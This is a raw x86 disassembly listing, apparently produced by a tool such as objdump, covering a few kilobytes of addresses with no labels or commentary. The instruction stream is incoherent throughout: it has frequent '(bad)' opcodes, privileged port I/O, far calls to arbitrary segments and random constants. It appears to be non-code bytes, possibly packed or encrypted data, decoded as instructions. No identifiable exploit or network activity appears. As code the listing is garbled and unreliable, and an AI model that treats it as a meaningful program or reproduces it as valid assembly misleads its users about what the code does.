  414f05:	outs   dx,DWORD PTR ds:[esi]
  414f06:	imul   esp,DWORD PTR [edx+0x15a5243e],0xd6c977da
  414f10:	pop    eax
  414f11:	inc    edx
  414f12:	iret   
  414f13:	mov    dl,0x75
  414f15:	or     eax,0xf9115592
  414f1a:	push   edx
  414f1b:	(bad)  
  414f1c:	mov    ecx,edi
  414f1e:	sub    eax,0x7fd1bdae
  414f23:	push   ebx
  414f24:	push   0xe134d202
  414f29:	pop    ebx
  414f2a:	iret   
  414f2b:	push   ecx
  414f2c:	push   edi
  414f2d:	int3   
  414f2e:	ins    DWORD PTR es:[edi],dx
  414f2f:	lods   eax,DWORD PTR ds:[esi]
  414f30:	pusha  
  414f31:	sar    BYTE PTR [ebx+0x8],0x69
  414f35:	test   eax,0x5b242ac
  414f3a:	mov    ds:0x76d1c0fc,al
  414f3f:	dec    ecx
  414f40:	fdivr  QWORD PTR [ebx]
  414f42:	popa   
  414f43:	mov    edx,DWORD PTR [esi+0x73f27b4a]
  414f49:	jle    0x414f8a
  414f4b:	fistp  QWORD PTR [edi+0x3]
  414f4e:	fidiv  DWORD PTR [esi+0x54]
  414f51:	xor    bh,ch
  414f53:	int3   
  414f54:	(bad)  
  414f55:	pop    edi
  414f56:	popa   
  414f57:	mov    ebp,0xae3ebb45
  414f5c:	daa    
  414f5d:	aad    0xbf
  414f5f:	jno    0x414f78
  414f61:	add    ah,BYTE PTR [eax+eiz*8]
  414f64:	ja     0x414fe2
  414f66:	ror    BYTE PTR [ecx-0x56],1
  414f69:	cmp    al,0x63
  414f6b:	mov    ds:0x446fbf82,eax
  414f70:	xor    bl,BYTE PTR [ebx+edx*4+0x68edfef5]
  414f77:	aam    0xa6
  414f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f7a:	jle    0x414efc
  414f7c:	pop    esi
  414f7d:	mov    es,edi
  414f7f:	jno    0x414ff4
  414f81:	xchg   edx,eax
  414f82:	pusha  
  414f83:	rol    esp,0xb0
  414f86:	mov    edx,0xdf69ae1a
  414f8b:	aam    0x4
  414f8d:	push   ebx
  414f8e:	outs   dx,BYTE PTR ds:[esi]
  414f8f:	not    DWORD PTR [ebp+0x7d089a63]
  414f95:	jne    0x414fb5
  414f97:	(bad)  
  414f98:	cmp    al,0xd
  414f9a:	sub    eax,0x9d6fd008
  414f9f:	aad    0xab
  414fa1:	pop    ebx
  414fa2:	pop    ds
  414fa3:	mov    ah,0xb7
  414fa5:	out    0xe0,al
  414fa7:	arpl   WORD PTR [esi+0x4f5cc82b],dx
  414fad:	xchg   esp,eax
  414fae:	fcmovnbe st,st(3)
  414fb0:	mov    DWORD PTR [edi+0x30ce43f],esp
  414fb6:	xchg   esp,eax
  414fb7:	popa   
  414fb8:	push   cs
  414fb9:	dec    edx
  414fba:	and    DWORD PTR [eax+eiz*4-0x5b709e54],ecx
  414fc1:	outs   dx,DWORD PTR ds:[esi]
  414fc2:	adc    DWORD PTR [ecx],ebp
  414fc4:	hlt    
  414fc5:	mov    ds:0x288c8ef,al
  414fca:	push   edx
  414fcb:	pop    ebp
  414fcc:	enter  0x7069,0x32
  414fd0:	or     edx,DWORD PTR [esi+ecx*4+0x53]
  414fd4:	scas   al,BYTE PTR es:[edi]
  414fd5:	dec    ebx
  414fd6:	in     al,dx
  414fd7:	pop    edi
  414fd8:	or     BYTE PTR [edx+eax*2],ah
  414fdb:	div    BYTE PTR [esi]
  414fdd:	retf   
  414fde:	ret    0xed4
  414fe1:	xchg   ecx,eax
  414fe2:	or     al,0xde
  414fe4:	mov    dh,0xce
  414fe6:	in     al,dx
  414fe7:	mov    ds:0x22ec1189,al
  414fec:	or     ch,BYTE PTR [eax]
  414fee:	std    
  414fef:	xor    al,0x0
  414ff1:	add    cl,BYTE PTR [esp+ebp*1]
  414ff4:	hlt    
  414ff5:	mov    eax,ds:0x5896151c
  414ffa:	inc    edi
  414ffb:	inc    edi
  414ffc:	frstor [esi]
  414ffe:	xor    bl,cl
  415000:	mov    BYTE PTR [ecx+0x2f],cl
  415003:	sbb    al,0xfb
  415005:	jmp    0x41500c
  415007:	mul    bh
  415009:	sbb    al,0xf8
  41500b:	sbb    eax,0xfa5df36d
  415010:	cwde   
  415011:	pop    esp
  415012:	sbb    al,0x71
  415014:	inc    eax
  415015:	cmp    ebx,DWORD PTR [edi]
  415017:	fwait
  415018:	js     0x414fb9
  41501a:	std    
  41501b:	cmp    DWORD PTR [esi],ebp
  41501d:	xor    al,0x86
  41501f:	aam    0xdb
  415021:	bound  eax,QWORD PTR [eax]
  415023:	and    dh,bh
  415025:	cmp    DWORD PTR [eax-0x41],esi
  415028:	jo     0x415007
  41502a:	xor    ebp,DWORD PTR [ebp-0x102f077]
  415030:	icebp  
  415031:	in     al,dx
  415032:	push   cs
  415033:	mov    ebx,0x265602bf
  415038:	xchg   ecx,eax
  415039:	sbb    DWORD PTR [edi+0x6085e835],edx
  41503f:	lods   eax,DWORD PTR ds:[esi]
  415040:	dec    esi
  415041:	popa   
  415042:	inc    ebx
  415043:	sub    DWORD PTR [edx+0x24d4f470],ebx
  415049:	lds    edx,FWORD PTR [ebx-0x449345dc]
  41504f:	js     0x6dba2d5c
  415055:	aaa    
  415056:	test   DWORD PTR [esp+ebx*2+0x2],0x296ab41e
  41505e:	sbb    DWORD PTR [ebx+0x66],esi
  415061:	rcr    BYTE PTR [edi],1
  415063:	daa    
  415064:	sbb    eax,0x98901334
  415069:	cs cmp al,cl
  41506c:	add    al,0xf9
  41506e:	loope  0x415045
  415070:	dec    edx
  415071:	add    eax,0x87fb8cab
  415076:	aas    
  415077:	mov    BYTE PTR [edi+0x9a6a095],dh
  41507d:	fdivr  DWORD PTR [eax]
  41507f:	xchg   ebx,eax
  415080:	loopne 0x4150b6
  415082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415083:	(bad)  
  415084:	call   0x292399f3
  415089:	and    ah,ch
  41508b:	cmp    al,0xbe
  41508d:	mov    eax,0xaa00360
  415092:	jbe    0x4150e5
  415094:	push   es
  415095:	cli    
  415096:	xor    al,0xd4
  415098:	arpl   WORD PTR [eax-0x50],cx
  41509b:	inc    esi
  41509c:	std    
  41509d:	push   0x77
  41509f:	aas    
  4150a0:	mov    DWORD PTR [ebx],esp
  4150a2:	sub    BYTE PTR [edx+0x494ae18c],cl
  4150a8:	pop    ebp
  4150a9:	add    edi,DWORD PTR [edx-0x187cf346]
  4150af:	xor    dl,dl
  4150b1:	(bad)  
  4150b2:	bound  edx,QWORD PTR [edi-0x2a4e08a7]
  4150b8:	pop    ds
  4150b9:	push   0xffffffe6
  4150bb:	sbb    BYTE PTR [ebx-0xe4473d9],0x2e
  4150c2:	mov    al,ds:0xd41cf486
  4150c7:	fsub   QWORD PTR [edi+0x2ca36377]
  4150cd:	outs   dx,BYTE PTR ds:[esi]
  4150ce:	sar    WORD PTR [eax-0x3e],0xe2
  4150d3:	ret    
  4150d4:	push   0x1937a27
  4150d9:	pop    ebx
  4150da:	(bad)  
  4150dc:	lahf   
  4150dd:	int    0xee
  4150df:	adc    cl,BYTE PTR [eax+0x72b61a3b]
  4150e5:	sar    DWORD PTR [ebx+0x72],cl
  4150e8:	jl     0x4150ec
  4150ea:	push   ss
  4150eb:	push   esp
  4150ec:	out    dx,al
  4150ed:	or     edx,DWORD PTR ds:0x1f55ec9d
  4150f3:	repz das 
  4150f5:	xor    ch,BYTE PTR [ecx+0x7b]
  4150f8:	outs   dx,BYTE PTR ds:[esi]
  4150f9:	retf   0xaa07
  4150fc:	mov    eax,ds:0x4412f4ac
  415101:	arpl   WORD PTR [eax+0xcbd41d1],cx
  415107:	sbb    eax,0x90b6db9b
  41510c:	push   es
  41510d:	add    edx,DWORD PTR [ebx+ebx*8+0x22]
  415111:	mov    gs,WORD PTR [edi-0xd0d9454]
  415117:	push   ebx
  415118:	loope  0x41511c
  41511a:	aas    
  41511b:	mov    ebx,0x6b60ba77
  415120:	inc    edi
  415121:	ret    0xaa0c
  415124:	mov    dh,0xdd
  415126:	in     al,0xd4
  415128:	mov    ebx,0x4f637878
  41512d:	mov    ds:0x4f94df68,eax
  415132:	int3   
  415133:	js     0x41517a
  415135:	cmp    al,0x77
  415138:	js     0x4150d5
  41513a:	outs   dx,DWORD PTR ds:[esi]
  41513b:	mov    ecx,0xfde1ba39
  415140:	enter  0x6548,0x6a
  415144:	sbb    ch,ah
  415146:	pop    ecx
  415147:	ja     0x415127
  415149:	mov    WORD PTR [edi],ds
  41514b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41514c:	bswap  edx
  41514e:	mov    eax,ds:0xc02b8f7
  415153:	div    BYTE PTR [esi-0x13acdf41]
  415159:	addr16 pop ds
  41515b:	or     DWORD PTR [esi+ebx*2],esp
  41515e:	inc    ebx
  41515f:	ret    0xbbd4
  415162:	test   ebp,edx
  415164:	arpl   bx,di
  415166:	dec    ecx
  415167:	mov    ebx,0x127a0b2
  41516c:	mov    ah,0x7
  41516e:	(bad)  
  41516f:	jg     0x4150f9
  415171:	xor    al,0xc5
  415173:	mov    eax,0xd4818d22
  415178:	mov    ebx,0xf8328bab
  41517d:	in     eax,dx
  41517e:	loop   0x4151f3
  415180:	sahf   
  415181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415182:	fcmovb st,st(6)
  415184:	pop    ebp
  415185:	add    bl,BYTE PTR [edi+0x14adc6b2]
  41518b:	mov    bl,0x34
  41518d:	iret   
  41518e:	lods   al,BYTE PTR ds:[esi]
  41518f:	aam    0xaa
  415191:	xchg   esp,eax
  415192:	jg     0x4151c7
  415194:	out    dx,al
  415195:	mov    ebx,DWORD PTR [edi]
  415197:	push   ebx
  415198:	pop    ss
  415199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41519a:	pop    ecx
  41519b:	push   eax
  41519c:	jl     0x415177
  41519e:	data16 aad 0xcf
  4151a1:	dec    esp
  4151a2:	xor    bh,dh
  4151a4:	xor    al,0xcc
  4151a6:	stos   DWORD PTR es:[edi],eax
  4151a7:	and    eax,0xce573f86
  4151ac:	lock jge 0x4151cd
  4151af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151b0:	inc    edx
  4151b1:	push   ecx
  4151b2:	push   ecx
  4151b3:	aad    0xab
  4151b5:	pop    ecx
  4151b6:	jne    0x4151be
  4151b8:	adc    DWORD PTR [edx-0x6c97e578],ebp
  4151be:	pop    ds
  4151bf:	(bad)  
  4151c0:	leave  
  4151c1:	mov    BYTE PTR [ecx-0x1b],ch
  4151c4:	mov    dh,0xe8
  4151c6:	call   0xd19005a0
  4151cb:	and    al,BYTE PTR [esi-0x23a1395]
  4151d1:	push   ebp
  4151d2:	loop   0x4151a9
  4151d4:	add    ebx,DWORD PTR [edx-0x1ce98d8e]
  4151da:	arpl   di,dx
  4151dc:	int    0x8f
  4151de:	sar    BYTE PTR [ecx-0x3094d18c],0xf0
  4151e5:	int3   
  4151e6:	mov    al,0xd6
  4151e8:	lds    edi,FWORD PTR [edi-0x265f008b]
  4151ee:	inc    ebx
  4151ef:	aam    0x5b
  4151f1:	inc    esi
  4151f2:	ret    0xf873
  4151f5:	add    eax,0xce88899a
  4151fa:	dec    esi
  4151fb:	fidiv  DWORD PTR [eax+0x57356444]
  415201:	inc    esi
  415202:	arpl   WORD PTR [ebp+0x698094ac],sp
  415208:	test   BYTE PTR ss:0xcda87285,ah
  41520f:	aam    0x58
  415211:	mov    dl,0xa2
  415213:	rol    bh,1
  415215:	ret    
  415216:	bound  esp,QWORD PTR [ecx+0x1a0bcaa0]
  41521c:	pop    ss
  41521d:	mov    ah,0x5f
  41521f:	fnstsw WORD PTR [ecx+0x3]
  415222:	ins    BYTE PTR es:[edi],dx
  415223:	sar    DWORD PTR [eax-0x7c],0x4e
  415227:	call   0x4db163f2
  41522c:	mov    esp,0xafd73dae
  415231:	out    dx,al
  415232:	repz sbb BYTE PTR [ebx+0x49],dh
  415236:	es cld 
  415238:	adc    eax,DWORD PTR [ebx+0x68b02397]
  41523e:	xchg   BYTE PTR [edx+0x138da586],al
  415244:	int3   
  415245:	sbb    bh,0x84
  415248:	into   
  415249:	or     esi,eax
  41524b:	aad    0x8d
  41524d:	ret    
  41524e:	push   esp
  41524f:	jg     0x4151e4
  415251:	cmp    BYTE PTR [edi+edx*2-0x1a8e4077],ch
  415258:	lock pop ss
  41525a:	cmp    ebx,DWORD PTR [edx+esi*1-0x7e83edfd]
  415261:	and    eax,0x1ceae0ac
  415266:	pop    ds
  415267:	(bad)  
  415268:	pop    edi
  415269:	mov    bl,0x3d
  41526b:	xchg   ebp,eax
  41526c:	sub    BYTE PTR [ebx+ecx*4],0xd4
  415270:	adc    esp,eax
  415272:	sbb    dl,bl
  415274:	and    edi,DWORD PTR [ebx+ebx*2+0xd78dd0]
  41527b:	adc    eax,0x15a8fb10
  415280:	lock dec esp
  415282:	outs   dx,BYTE PTR ds:[esi]
  415283:	aam    0x91
  415285:	repnz xchg esi,eax
  415287:	imul   ecx,DWORD PTR [ebp+eiz*4-0x36],0x7c
  41528c:	mov    DWORD PTR ds:0x94b44c3a,edi
  415292:	(bad)  
  415293:	fst    QWORD PTR [edx+eax*1+0x2d028860]
  41529a:	adc    ebp,eax
  41529c:	cmp    esi,0x13
  41529f:	std    
  4152a0:	mov    DWORD PTR [ebx-0x1fdf6a55],esi
  4152a6:	mov    ds:0xd0f6d463,eax
  4152ab:	aam    0x86
  4152ad:	inc    DWORD PTR [ecx+0x37f5662f]
  4152b3:	stc    
  4152b4:	mov    bh,dl
  4152b6:	xchg   ecx,eax
  4152b7:	pushf  
  4152b8:	fdivr  DWORD PTR [edx]
  4152ba:	neg    BYTE PTR [edi+ecx*1-0x1]
  4152be:	in     eax,dx
  4152bf:	lds    edx,FWORD PTR ds:0x3841bc47
  4152c5:	add    eax,DWORD PTR [eax-0x12]
  4152c8:	push   ss
  4152c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152ca:	stos   DWORD PTR es:[edi],eax
  4152cb:	mov    cs,WORD PTR [ecx+0x7c0aec6f]
  4152d1:	xlat   BYTE PTR es:[ebx]
  4152d3:	jmp    0x4152a2
  4152d5:	xchg   BYTE PTR [ebp-0x30],cl
  4152d8:	mov    DWORD PTR [ebx],esp
  4152da:	xchg   ebx,eax
  4152db:	jo     0x415356
  4152dd:	lods   eax,DWORD PTR ds:[esi]
  4152de:	(bad)  
  4152df:	jmp    0xb370:0x37607740
  4152e6:	jge    0x41533d
  4152e8:	loop   0x415309
  4152ea:	pop    edi
  4152eb:	fwait
  4152ec:	sub    BYTE PTR [ebx],al
  4152ee:	sbb    al,0xd3
  4152f0:	lds    edi,FWORD PTR [esp+eiz*8+0x138030bc]
  4152f7:	or     DWORD PTR [eax-0x32ff6355],0x29
  4152fe:	push   ss
  4152ff:	cmp    DWORD PTR [edi],ecx
  415301:	add    esp,DWORD PTR [esp+edx*4+0x7a]
  415305:	mov    esi,0x90b1ac99
  41530a:	data16 int 0xd2
  41530d:	xchg   DWORD PTR [eax+0x45033d0a],ebx
  415313:	sbb    eax,0xdf0626e6
  415318:	jl     0x415309
  41531a:	fisttp WORD PTR [ecx]
  41531c:	clc    
  41531d:	and    eax,0x2b88613f
  415322:	and    BYTE PTR [ecx*8+0x4f0163c4],ah
  415329:	adc    al,0x52
  41532b:	and    edi,edx
  41532d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41532e:	dec    edi
  41532f:	hlt    
  415330:	sbb    DWORD PTR [eax],eax
  415332:	mov    edx,0x6fb8e7f
  415337:	mov    ebx,0xf4aa2dc0
  41533c:	in     al,0x90
  41533e:	shr    DWORD PTR [edx+0x2ab9a998],cl
  415344:	lock add dl,BYTE PTR [ecx]
  415347:	adc    eax,DWORD PTR [edi]
  415349:	fs push ds
  41534b:	jg     0x415389
  41534d:	shl    BYTE PTR [edi-0x43e2c3c7],1
  415353:	aam    0x9
  415355:	cmp    DWORD PTR [eax+0xf],ebp
  415358:	sbb    dl,0x18
  41535b:	in     al,0x94
  41535d:	inc    edi
  41535e:	jg     0x41539b
  415360:	call   0x166a:0xeaac7f85
  415367:	repz imul esp,DWORD PTR [esp+ecx*1],0xde705694
  41536f:	stc    
  415370:	jg     0x4153ac
  415372:	gs out 0x87,al
  415375:	stos   DWORD PTR es:[edi],eax
  415376:	mov    DWORD PTR [ecx+0x45],ecx
  415379:	sbb    al,0x5e
  41537b:	fcom   st(2)
  41537d:	xor    DWORD PTR [ebp+0x47441bd4],0x73
  415384:	outs   dx,BYTE PTR ds:[esi]
  415386:	retf   
  415387:	cld    
  415388:	xchg   esi,eax
  415389:	sbb    DWORD PTR [ecx+0x3a05e806],ebx
  41538f:	add    eax,0xd70b37f4
  415394:	or     al,0xbd
  415396:	pop    ebp
  415397:	test   al,0x29
  415399:	and    edx,DWORD PTR [bp+si]
  41539c:	test   eax,0xa4e11f84
  4153a1:	sahf   
  4153a2:	sti    
  4153a3:	push   ebp
  4153a4:	data16 jg 0x415341
  4153a7:	aad    0x92
  4153a9:	fs dec eax
  4153ab:	add    eax,0x30d70376
  4153b0:	mov    DWORD PTR [ebx-0x6d],edx
  4153b3:	fcomp  st(0)
  4153b5:	xchg   esi,eax
  4153b6:	dec    ebp
  4153b7:	jle    0x41538e
  4153b9:	dec    eax
  4153ba:	sub    bh,dh
  4153bc:	fcomp  QWORD PTR [edi-0x1bb19e7a]
  4153c2:	jo     0x4153c0
  4153c4:	dec    ecx
  4153c5:	mov    ebx,0x62c6cf1f
  4153ca:	mov    ah,0x1c
  4153cc:	mov    WORD PTR [edi+eiz*4-0x14],es
  4153d0:	sub    al,0x26
  4153d2:	mov    eax,0xdf152074
  4153d7:	add    DWORD PTR [eax-0x741f83b6],ebx
  4153dd:	mov    edi,0xea73f251
  4153e2:	icebp  
  4153e3:	ret    0xd64b
  4153e6:	loopne 0x41539e
  4153e8:	xchg   edx,eax
  4153e9:	add    eax,0x5d30c750
  4153ee:	pop    esp
  4153ef:	lock push ebp
  4153f1:	fcomp  DWORD PTR [edi]
  4153f3:	add    ebx,DWORD PTR [ecx+edx*8+0x3]
  4153f7:	clc    
  4153f8:	mov    dh,0xf9
  4153fa:	js     0x4153f5
  4153fc:	lds    eax,FWORD PTR ds:0x86b0acc6
  415402:	or     esp,DWORD PTR [edx+0x560dcfa]
  415408:	cmp    eax,0xacf20090
  41540d:	mov    ebx,0xff2f98e1
  415412:	push   cs
  415413:	aam    0xb0
  415415:	jge    0x415493
  415417:	imul   edx,DWORD PTR [edx-0x3b7ae7f6],0x8957cfc7
  415421:	inc    edi
  415422:	push   edi
  415423:	push   0xd48d7d0e
  415428:	mov    WORD PTR [ebx],es
  41542a:	adc    DWORD PTR gs:[ebp+0x5],0x5588c794
  415432:	lahf   
  415433:	cs push esi
  415435:	test   DWORD PTR [eax],0x8c14526d
  41543b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41543c:	retf   
  41543d:	mov    ebx,0xa1bcd797
  415442:	xor    BYTE PTR [edi+edi*1],bh
  415445:	mov    eax,0x87fd5758
  41544a:	push   edi
  41544b:	push   esp
  41544c:	mov    DWORD PTR [ebx-0x20e10695],esp
  415452:	data16 aam 0x51
  415455:	and    BYTE PTR [eax],dh
  415457:	repz jae 0x415426
  41545a:	mov    ebp,0xb6c38904
  41545f:	mov    ebp,0xe79f0569
  415464:	inc    BYTE PTR ds:0xba1c9e9a
  41546a:	stos   BYTE PTR es:[edi],al
  41546b:	(bad)  
  41546c:	xchg   edi,eax
  41546d:	retf   0xeb60
  415470:	outs   dx,DWORD PTR ds:[esi]
  415471:	xchg   edx,eax
  415472:	inc    eax
  415473:	push   es
  415474:	jb     0x4154c7
  415476:	xor    eax,0x2e785baa
  41547b:	pop    ebp
  41547c:	repnz inc edx
  41547e:	and    bl,BYTE PTR [eax+0x2d1f9009]
  415484:	jnp    0x4154cd
  415486:	adc    esp,edi
  415488:	adc    ecx,DWORD PTR [esi]
  41548a:	js     0x4154d0
  41548c:	sub    BYTE PTR [ebp+0x1c23fdac],al
  415492:	sub    BYTE PTR [esi+0x54aeaa9e],ah
  415498:	push   esi
  415499:	mov    al,dl
  41549b:	and    DWORD PTR [esi+0x6d92e247],eax
  4154a1:	or     esp,DWORD PTR [eax+0x4209865c]
  4154a7:	lahf   
  4154a8:	or     DWORD PTR [ebp+0x1591d4ba],esp
  4154ae:	sti    
  4154af:	sub    DWORD PTR ds:0xb06538e1,0x2b
  4154b6:	mov    ch,0x46
  4154b8:	cld    
  4154b9:	es inc edx
  4154bb:	push   cs
  4154bc:	mov    dl,0x42
  4154be:	xchg   BYTE PTR [eax-0x661372d6],cl
  4154c4:	retf   0x72c6
  4154c7:	sbb    ch,ah
  4154c9:	sbb    BYTE PTR [ebp-0x39a06d88],0x65
  4154d0:	div    BYTE PTR [ebx-0x55]
  4154d3:	aam    0xdd
  4154d5:	xchg   esi,eax
  4154d6:	mov    ?,WORD PTR [edx]
  4154d8:	(bad)  
  4154d9:	mov    ecx,0x27bfd44f
  4154de:	ins    BYTE PTR es:[edi],dx
  4154df:	imul   ebp,DWORD PTR [esi],0x5a
  4154e2:	dec    edx
  4154e3:	stc    
  4154e4:	(bad)  
  4154e5:	out    0xf0,eax
  4154e7:	inc    ebp
  4154e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154e9:	dec    eax
  4154ea:	nop
  4154eb:	cmc    
  4154ec:	pop    es
  4154ed:	dec    DWORD PTR [edx-0x6c]
  4154f0:	pop    ds
  4154f1:	fld    TBYTE PTR [edi+esi*1]
  4154f4:	or     al,0x93
  4154f6:	push   ss
  4154f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154f8:	pop    ecx
  4154f9:	inc    ebx
  4154fa:	aam    0xb7
  4154fc:	mov    cl,dl
  4154fe:	enter  0x3263,0xb9
  415502:	adc    dh,BYTE PTR [edi+eiz*4-0x76e59bc7]
  415509:	sub    esp,edi
  41550b:	push   ds
  41550c:	inc    edi
  41550d:	mov    al,ds:0x2d58f3ba
  415512:	js     0x415559
  415514:	mov    edx,0x226a6007
  415519:	cmp    al,0x5
  41551b:	ror    DWORD PTR [ecx-0x9136297],1
  415521:	push   ecx
  415522:	or     BYTE PTR [ebx-0x42],bl
  415525:	add    eax,0x561f8464
  41552a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41552b:	sbb    cl,cl
  41552d:	inc    eax
  41552e:	xchg   edi,eax
  41552f:	aad    0xad
  415531:	mov    BYTE PTR [esi-0x2c],al
  415534:	pop    esp
  415535:	into   
  415536:	jns    0x4154f2
  415538:	push   0xfffffffe
  41553a:	mov    ds:0xc6409cd4,eax
  41553f:	sub    BYTE PTR ds:0x96433f69,bh
  415545:	sti    
  415546:	fwait
  415547:	cmp    ebp,esp
  415549:	sbb    al,0x6
  41554b:	mov    edi,0x3221521c
  415550:	inc    esi
  415551:	jmp    0x4154e3
  415553:	aad    0xe3
  415555:	add    al,0xed
  415557:	lea    ebx,[edx-0x49]
  41555a:	inc    ebp
  41555b:	inc    esp
  41555c:	bound  ecx,QWORD PTR [esi+0x1f]
  41555f:	(bad)  
  415560:	and    dh,bl
  415562:	fcomip st,st(2)
  415564:	and    al,0x3d
  415566:	cmp    al,0xd4
  415568:	adc    eax,0xfa842f0c
  41556d:	xchg   ebp,eax
  41556e:	or     eax,0x25bf8a95
  415573:	outs   dx,DWORD PTR ds:[esi]
  415574:	(bad)  [ecx+0x5d51b74]
  41557a:	adc    BYTE PTR [edi],0xc4
  41557d:	cld    
  41557e:	add    eax,0x60a8a8c1
  415583:	cdq    
  415584:	iret   
  415585:	push   ebx
  415586:	or     eax,0x64b3f67b
  41558b:	aam    0xfe
  41558d:	adc    eax,0xcf472992
  415592:	mov    esi,0x1f695106
  415597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415598:	call   0x4021:0x96413196
  41559f:	sahf   
  4155a0:	xchg   BYTE PTR [esi],bh
  4155a2:	mov    ebp,edx
  4155a4:	mov    ah,0x62
  4155a6:	pop    esi
  4155a7:	xor    eax,0x794e26a4
  4155ac:	es enter 0x38fc,0x8e
  4155b1:	dec    ebx
  4155b2:	(bad)  
  4155b3:	in     eax,0x80
  4155b5:	xchg   edi,eax
  4155b6:	push   ebx
  4155b7:	xlat   BYTE PTR ds:[ebx]
  4155b8:	adc    esi,DWORD PTR [ecx-0x1a585ba0]
  4155be:	or     edx,DWORD PTR [esi]
  4155c0:	mov    DWORD PTR [edi+0x1bcf82e5],ebx
  4155c6:	out    0x9a,eax
  4155c8:	mov    al,BYTE PTR [edx]
  4155ca:	sbb    al,0x8
  4155cc:	aam    0xeb
  4155ce:	test   DWORD PTR [ebx],edx
  4155d0:	lea    ebp,[edi+0x1e]
  4155d3:	and    eax,0x8f50c0f8
  4155d8:	mov    al,0xe2
  4155da:	rcl    esp,0xee
  4155dd:	push   ss
  4155de:	jo     0x4155df
  4155e0:	xor    DWORD PTR [ebp+0x1d49ea55],0xd9ff260d
  4155ea:	leave  
  4155eb:	xlat   BYTE PTR ds:[ebx]
  4155ec:	mov    ebx,0x99c90551
  4155f1:	xor    eax,0x271750e
  4155f6:	mov    al,0xa2
  4155f8:	aas    
  4155f9:	push   ebp
  4155fa:	imul   ecx,DWORD PTR [edx],0xe6023692
  415600:	mov    BYTE PTR [ebx],ah
  415602:	call   0x97ac:0xf0b7007e
  415609:	(bad)  
  41560a:	daa    
  41560b:	sub    eax,0xf4e93f0
  415610:	xchg   ebp,eax
  415611:	add    ch,dh
  415613:	out    dx,al
  415614:	loop   0x4155e4
  415616:	sbb    eax,0xac798ba4
  41561b:	cmp    dl,BYTE PTR [ebp+eiz*4+0x12]
  41561f:	fwait
  415620:	cmp    ch,ch
  415622:	or     dl,bh
  415624:	mov    al,0xbf
  415626:	scas   eax,DWORD PTR es:[edi]
  415627:	or     DWORD PTR [ebx-0x73],esi
  41562a:	(bad)  
  41562b:	push   es
  41562c:	mov    DWORD PTR [edi+0x71],ecx
  41562f:	lods   al,BYTE PTR ds:[esi]
  415630:	adc    al,0xa8
  415632:	das    
  415633:	add    al,0xf3
  415635:	add    eax,0xe0746c5c
  41563a:	pop    ebx
  41563b:	scas   al,BYTE PTR es:[edi]
  41563c:	sahf   
  41563d:	imul   esp,DWORD PTR [ecx-0x23],0xe
  415641:	push   ds
  415642:	mov    al,0xff
  415644:	jo     0x415634
  415646:	cmp    edx,DWORD PTR [eax+0x49]
  415649:	bound  esp,QWORD PTR [esp+ebp*8]
  41564c:	test   eax,0x8709f258
  415651:	pop    ds
  415652:	pop    edx
  415653:	push   ebx
  415654:	loop   0x415631
  415656:	test   ch,ah
  415658:	mov    esp,0x3f0fbac2
  41565d:	add    esi,esi
  41565f:	lods   eax,DWORD PTR ds:[esi]
  415660:	stc    
  415661:	pop    es
  415662:	push   ecx
  415663:	rcr    DWORD PTR ds:0x52557d29,cl
  415669:	fbstp  TBYTE PTR [esi]
  41566b:	scas   al,BYTE PTR es:[edi]
  41566c:	in     eax,0x88
  41566e:	loopne 0x4156ba
  415670:	push   cs
  415671:	cmc    
  415672:	and    al,0xb8
  415674:	icebp  
  415675:	xchg   esp,eax
  415676:	add    BYTE PTR [edx-0x38],ah
  415679:	push   ebp
  41567a:	mov    dl,0x1a
  41567c:	xlat   BYTE PTR ds:[ebx]
  41567d:	inc    edx
  41567e:	push   ds
  41567f:	fild   WORD PTR [esi]
  415681:	ret    0xfd76
  415684:	mov    bh,0x30
  415686:	mov    edx,0xe2b47a
  41568b:	push   0xffffff88
  41568d:	fwait
  41568e:	mov    ch,0x11
  415690:	adc    ax,0x859f
  415694:	lsl    ebp,WORD PTR [eax+0x7ac56d96]
  41569b:	pop    esi
  41569c:	sbb    eax,0xac0d1fc1
  4156a1:	pop    esp
  4156a2:	add    al,0x8
  4156a4:	cwde   
  4156a5:	sti    
  4156a6:	adc    al,0xac
  4156a8:	hlt    
  4156a9:	xchg   edx,eax
  4156aa:	push   ebp
  4156ab:	push   ecx
  4156ac:	mov    ecx,0xea23e502
  4156b1:	dec    esi
  4156b2:	push   ds
  4156b3:	jecxz  0x4156ec
  4156b5:	cmp    dl,BYTE PTR [edi-0x6922924f]
  4156bb:	inc    ebx
  4156bc:	shr    DWORD PTR [edi+ebx*1],cl
  4156bf:	fcomp  st(4)
  4156c1:	mov    eax,ds:0xcb2805ab
  4156c6:	xchg   esp,eax
  4156c7:	stos   DWORD PTR es:[edi],eax
  4156c8:	aas    
  4156c9:	add    dh,ch
  4156cb:	jbe    0x4156db
  4156cd:	xchg   DWORD PTR [ebx-0x48],edi
  4156d0:	pop    eax
  4156d1:	add    dl,BYTE PTR [eax]
  4156d3:	psubb  mm2,QWORD PTR [ebx+0x5a]
  4156d7:	sub    eax,0xb7f77fc0
  4156dc:	push   ss
  4156dd:	add    ch,BYTE PTR [esi]
  4156df:	ja     0x415755
  4156e1:	jne    0x415682
  4156e3:	sub    edi,eax
  4156e5:	not    BYTE PTR [ebx+0x2ab17faa]
  4156eb:	inc    esi
  4156ec:	shl    BYTE PTR [edx],0x24
  4156ef:	lods   al,BYTE PTR ds:[esi]
  4156f0:	mov    ds:0x87251f34,eax
  4156f5:	out    dx,al
  4156f6:	scas   eax,DWORD PTR es:[edi]
  4156f7:	imul   DWORD PTR [eax+0xf]
  4156fa:	je     0x4156b5
  4156fc:	std    
  4156fd:	scas   eax,DWORD PTR es:[edi]
  4156fe:	xor    eax,0x26634657
  415703:	lds    edx,FWORD PTR [edi]
  415705:	inc    edx
  415706:	icebp  
  415707:	dec    esp
  415708:	xor    ecx,edi
  41570a:	pop    ds
  41570b:	jecxz  0x415701
